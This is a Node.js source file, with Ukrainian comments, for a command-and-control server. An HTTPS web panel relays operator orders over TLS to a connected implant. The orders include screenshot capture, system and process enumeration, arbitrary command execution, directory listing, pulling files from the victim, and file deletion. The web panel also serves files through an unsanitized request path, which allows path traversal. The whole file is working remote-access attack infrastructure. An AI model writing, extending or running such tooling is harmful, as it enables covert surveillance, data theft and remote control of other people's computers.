const https = require('https');
const url = require('url');
const fs = require('fs');
const ejs = require('ejs');
// const net = require('net');
const tls = require('tls');
const path = require('path');

let integ = 5;
let so_id;
let wdir = "./web/"
let adir = "./artifacts/"
let delmtr = "__DELIMITER_UNIQUE_STRING_1234567890__\n"
// Налаштування порту
const WEB_PORT = 3000;
const C2_PORT = 3001;

const mimeTypes = {
    '.html': 'text/html',
    '.js': 'text/javascript',
    '.css': 'text/css',
    '.json': 'application/json',
    '.ico': 'image/x-icon',
    '.png': 'image/png',
    '.jpg': 'image/jpg',
    '.gif': 'image/gif',
    '.svg': 'image/svg+xml',
    '.woff': 'application/font-woff',
    '.woff2': 'application/font-woff2',
    '.otf': 'application/font-otf',
    '.ttf': 'application/font-ttf',
    '.eot': 'application/vnd.ms-fontobject',
    '.pdf': 'application/pdf',
    '.zip': 'application/zip',
    '.txt': 'text/plain',
};

const options = {
    key: fs.readFileSync('cert/privatekey.pem'),
    cert: fs.readFileSync('cert/certificate.pem'),
};

// Створення сервера
const server = https.createServer(options, (req, res) => {
    const parsedUrl = url.parse(req.url, true);
    const path_ = parsedUrl.pathname;
    const query = parsedUrl.query;
    // console.log(parsedUrl);
    console.log(path_);
    // console.log(query);

    switch(req.method) {
        case 'GET':
            switch (path_){
                case '/doit':
                    res.writeHead(200, { 'Content-Type': 'text/plain' });
                    // res.end(`Hello ${query.name}, you number ${integ} and id:${query.id}`);
                    ejs.renderFile(wdir + 'page2.ejs', { integ: integ, query: query }, (err, str) => {
                        if (err) {
                            res.writeHead(500, { 'Content-Type': 'text/plain' });
                            res.end('Server error');
                        } else {
                            res.writeHead(500, { 'Content-Type': 'text/html' });
                            res.end(str);
                        }
                    })
                    break;
                case '/':
                    res.writeHead(200, { 'Content-Type': 'text/html' });
                    fs.readFile(wdir + 'serv.html', (err, data) => {
                        if (err) {
                            res.writeHead(500, { 'Content-Type': 'text/plain' });
                            res.end('Server error');
                        } else {
                            res.writeHead(200, {'Content-Type': 'text/html'});
                            res.end(data);
                        }
                    })
                    break;
                default:
                    const extname = String(path.extname(path_)).toLowerCase();

                    const contentType = mimeTypes[extname] || 'application/octet-stream';
                    const fileStream = fs.createReadStream('.' + decodeURIComponent(path_));

                    fileStream.on('open', () => {
                        res.writeHead(200, { 'Content-Type': contentType });
                        fileStream.pipe(res);
                    });
                    
                    fileStream.on('error', (error) => {
                        if (error.code === 'ENOENT') {
                            res.writeHead(404, { 'Content-Type': 'text/html' });
                            res.end('<h1>404 Not Found</h1>', 'utf-8');
                        } else {
                            res.writeHead(500);
                            res.end('Sorry, there was an error: ' + error.code + ' ..\n');
                        }
                    });
                    
            }
            break;
        case 'POST':
            let body = '';
            req.on('data', ch => {
                body += ch.toString();
            });
            switch(path_){
                case '/send-id':
                    req.on('end', () => {
                        const params = new URLSearchParams(body);
                        const id = Number(params.get('id'));
                        console.log(`id: ${id}`);
                        if (so_id && !so_id.destroyed && !isNaN(id)) {
                            so_id.write(JSON.stringify({com: id}));
                            so_id.once('data', (data) => {
                                res.writeHead(200, { 'Content-Type': 'text/plain' });
                                res.end(`Client response: ${data}`);
                            })

                        } else {
                            res.writeHead(500, { 'Content-Type': 'text/plain' });
                            res.end('No TCP client connected or bad comand');
                        }
                    });

                    res.on('error', (err) => {
                        console.error(`Error: ${err}`);
                        res.writeHead(500, { 'Content-Type': 'text/plain' });
                        res.end('Server error');
                    });
                    break;
                case '/do':
                    req.on('end', () => {
                        if (so_id && !so_id.destroyed) {
                            const root = JSON.parse(body);
                    
                            // Clean previous listeners if necessary
                            so_id.removeAllListeners();
                    
                            switch(root.action) {
                                case 'take_screenshot':
                                    so_id.write(JSON.stringify({ com: 0 }) + delmtr);
                                    
                                    let screenshotData = '';
                    
                                    // Listen for incoming data for screenshot
                                    so_id.on('data', (data) => {
                                        screenshotData += data.toString();
                    
                                        // Process complete messages whenever the delimiter delmtr appears
                                        while (screenshotData.includes(delmtr)) {
                                            const delimiterIndex = screenshotData.indexOf(delmtr);
                                            const message = screenshotData.slice(0, delimiterIndex);
                                            screenshotData = screenshotData.slice(delimiterIndex + delmtr.length);
                    
                                            try {
                                                const parsedData = JSON.parse(message);
                                                res.writeHead(200, { 'Content-Type': 'application/json' });
                    
                                                const binpng = Buffer.from(parsedData.img, 'base64');
                                                fs.writeFile(`${adir}screenshot_${Math.floor(Date.now() / 1000)}.bmp`, binpng, (err) => {
                                                    if (err) {
                                                        console.error('Error writing file:', err);
                                                    } else {
                                                        console.log('File created successfully!');
                                                    }
                                                });
                    
                                                // Send JSON response with the parsed image data
                                                // res.end(JSON.stringify({ status: "OK", screenshot: `data:image/png;base64,${parsedData.img}` }));
						res.end(JSON.stringify({ status: "OK", screenshot: `data:image/bmp;base64,${parsedData.img}` }));
                                            } catch (error) {
                                                console.error('Error parsing JSON:', error);
                                                res.writeHead(500, { 'Content-Type': 'application/json' });
                                                res.end(JSON.stringify({ status: "error", message: "Invalid JSON received" }));
                                            }
                                        }
                                    });
                    
                                    // Handle connection end
                                    so_id.on('end', () => {
                                        console.log("Connection ended for screenshot");
                                    });
                    
                                    // Handle socket errors
                                    so_id.on('error', (err) => {
                                        console.error('Stream error:', err);
                                        res.writeHead(500, { 'Content-Type': 'application/json' });
                                        res.end(JSON.stringify({ status: "error", message: "Stream error" }));
                                    });
                                    break;
                    
                                case 'get_system_info':
                                    so_id.write(JSON.stringify({ com: 1 }) + delmtr);
                                    
                                    let systemInfoData = '';
                    
                                    // Listen for incoming data for system info
                                    so_id.on('data', (data) => {
                                        systemInfoData += data.toString();
                    
                                        // Process complete messages whenever the delimiter delmtr appears
                                        while (systemInfoData.includes(delmtr)) {
                                            const delimiterIndex = systemInfoData.indexOf(delmtr);
                                            const message = systemInfoData.slice(0, delimiterIndex);
                                            systemInfoData = systemInfoData.slice(delimiterIndex + delmtr.length);
                    
                                            try {
                                                const sysinfodata = JSON.parse(message);
                                                sysinfodata.status = "OK";
                                                res.writeHead(200, { 'Content-Type': 'application/json' });
                                                res.end(JSON.stringify(sysinfodata));
                                            } catch (error) {
                                                console.error('Error parsing JSON:', error);
                                                res.writeHead(500, { 'Content-Type': 'application/json' });
                                                res.end(JSON.stringify({ status: "error", message: "Invalid JSON received" }));
                                            }
                                        }
                                    });
                    
                                    // Handle connection end
                                    so_id.on('end', () => {
                                        console.log("Connection ended for system info");
                                    });
                    
                                    // Handle socket errors
                                    so_id.on('error', (err) => {
                                        console.error('Stream error:', err);
                                        res.writeHead(500, { 'Content-Type': 'application/json' });
                                        res.end(JSON.stringify({ status: "error", message: "Stream error" }));
                                    });
                                    break;
                                case 'exec_com':
					console.log(root.command);
                                    so_id.write(JSON.stringify({ com: 2, inp: root.command }) + delmtr);
                                    let comm_json = '';

                                    so_id.on('data', (data) => {
                                        comm_json += data.toString();
                    
                                        // Process complete messages whenever the delimiter delmtr appears
                                        while (comm_json.includes(delmtr)) {
                                            const delimiterIndex = comm_json.indexOf(delmtr);
                                            const message = comm_json.slice(0, delimiterIndex);
                                            comm_json = comm_json.slice(delimiterIndex + delmtr.length);
                    
                                            try {
                                                const parsedData = JSON.parse(message);
                                                parsedData.status = "OK";
						console.log(message);
                                                res.writeHead(200, { 'Content-Type': 'application/json' });
                                                res.end(JSON.stringify(parsedData));
                                            } catch (error) {
                                                console.error('Error parsing JSON:', error);
                                                res.writeHead(500, { 'Content-Type': 'application/json' });
                                                res.end(JSON.stringify({ status: "error", message: "Invalid JSON received" }));
                                            }
                                        }
                                    });
                    
                                    // Handle connection end
                                    so_id.on('end', () => {
                                        console.log("Connection ended for system info");
                                    });
                    
                                    // Handle socket errors
                                    so_id.on('error', (err) => {
                                        console.error('Stream error:', err);
                                        res.writeHead(500, { 'Content-Type': 'application/json' });
                                        res.end(JSON.stringify({ status: "error", message: "Stream error" }));
                                    });
                                    break;
                                case 'dir_list':
                                    so_id.write(JSON.stringify({com: 3, dir: root.dir}) + delmtr);
                                    let cli_dir = '';
                                    so_id.on('data', (data) => {
                                        cli_dir += data.toString();
                                        while(cli_dir.includes(delmtr)) {
                                            const pos = cli_dir.indexOf(delmtr);
                                            const mess_dir = cli_dir.slice(0, pos);
                                            cli_dir = cli_dir.slice(pos +3);
                                            try {
                                                const dir_data = JSON.parse(mess_dir);
                                                dir_data.status = "OK"
                                                res.writeHead(200, { 'Content-Type': 'application/json' });
                                                res.end(JSON.stringify(dir_data));                                            
                                            } catch (error) {
                                                console.error('Error parsing JSON:', error);
                                                res.writeHead(500, { 'Content-Type': 'application/json' });
                                                res.end(JSON.stringify({ status: "error", message: "Invalid JSON received" }));
                                            }

                                        }
                                    })
                                    break;
                                case 'save_file':
                                    so_id.write(JSON.stringify({com: 4, path: root.path}) + delmtr);
                                    const writeStream = fs.createWriteStream(adir+path.basename(root.path), { flags: 'w' });
                                    let dataReceived = 0;
                                    so_id.on('data', (data) => {
                                        console.log(`Received chunk of ${data.length} bytes`);
                                        if (data.includes(delmtr)) {
                                            console.log(data);
                                            writeStream.end();
                                        } else {
                                            writeStream.write(data, (err) => {
                                                if (err) {
                                                    console.error('Error writing chunk:', err);
                                                    so_id.write(JSON.stringify({ status: "error", message: "Error writing file chunk" }));
                                                    return;
                                                }
                                                dataReceived += data.length;
                                            });                                            
                                        }

                                    });
                                    writeStream.on('finish', () => {
                                        console.log('File write complete');
                                        res.writeHead(200, { 'Content-Type': 'application/json' });
                                        res.end(JSON.stringify({ status: "OK", url: '/artifacts/' + path.basename(root.path) }));
                                    });
                                    break;
                                case 'del_file':
                                    so_id.write(JSON.stringify({com: 5, path: root.path}) + delmtr);
                                    let cli_del = '';
                                    so_id.on('data', (data) => {
                                        cli_del += data.toString();
                                        while (cli_del.includes(delmtr)) {
                                            const delimiterIndex = cli_del.indexOf(delmtr);
                                            const message = cli_del.slice(0, delimiterIndex);
                                            cli_del = cli_del.slice(delimiterIndex + 3);

                                            if (JSON.parse(message).status === "OK") {
                                                res.writeHead(200, { 'Content-Type': 'application/json' });
                                                res.end(message);
                                            }
                                        }
                                    });
                                    break;
                                case 'proc_info': {
                                    so_id.write(JSON.stringify({ com: 6 }) + delmtr);
                                    
                                    let systemInfoData = '';
                    
                                    // Listen for incoming data for system info
                                    so_id.on('data', (data) => {
                                        systemInfoData += data.toString();
                    
                                        // Process complete messages whenever the delimiter delmtr appears
                                        while (systemInfoData.includes(delmtr)) {
                                            const delimiterIndex = systemInfoData.indexOf(delmtr);
                                            const message = systemInfoData.slice(0, delimiterIndex);
                                            systemInfoData = systemInfoData.slice(delimiterIndex + delmtr.length);
                    
                                            try {
                                                const proc_data = JSON.parse(message);
                                                proc_data.status = "OK";
                                                res.writeHead(200, { 'Content-Type': 'application/json' });
                                                res.end(JSON.stringify(proc_data));
                                            } catch (error) {
                                                console.error('Error parsing JSON:', error);
                                                res.writeHead(500, { 'Content-Type': 'application/json' });
                                                res.end(JSON.stringify({ status: "error", message: "Invalid JSON received" }));
                                            }
                                        }
                                    });
                    
                                    // Handle connection end
                                    so_id.on('end', () => {
                                        console.log("Connection ended for system info");
                                    });
                    
                                    // Handle socket errors
                                    so_id.on('error', (err) => {
                                        console.error('Stream error:', err);
                                        res.writeHead(500, { 'Content-Type': 'application/json' });
                                        res.end(JSON.stringify({ status: "error", message: "Stream error" }));
                                    });                                    
                                }
                                    break;
                                default:
                                    console.log(`${root.action} not recognized`);
                                    res.writeHead(400, { 'Content-Type': 'application/json' });
                                    res.end(JSON.stringify({ status: "error", message: "Invalid action" }));
                                    break;
                            }
                        } else {
                            res.writeHead(500, { 'Content-Type': 'application/json' });
                            res.end(JSON.stringify({ status: "error", message: "Client is disconnected" }));
                        }
                    });                    
                break;
            }
            break;
    }
});

const server2 = tls.createServer(options, (so) => {
    console.log(`Client connected with: ${so.remoteAddress}:${so.remotePort}`);
    so_id = so;

    so.on('data', (data) => {
        //console.log(`Resv data: ${data}`);
        // so.write(`Send: ${integ}\n`);
    });

    so.on('end', () => {
        console.log('Client disconect');
    });

    so.on('error', (err) => {
        console.error(`Error: ${err}`);
    });
});

// Запуск сервера
server.listen(WEB_PORT, () => {
    console.log(`WebServer is running at http://172.16.218.140:${WEB_PORT}`);
});

server2.listen(C2_PORT, () => {
    console.log(`C2Server is running at http://172.16.218.140:${C2_PORT}`);
});


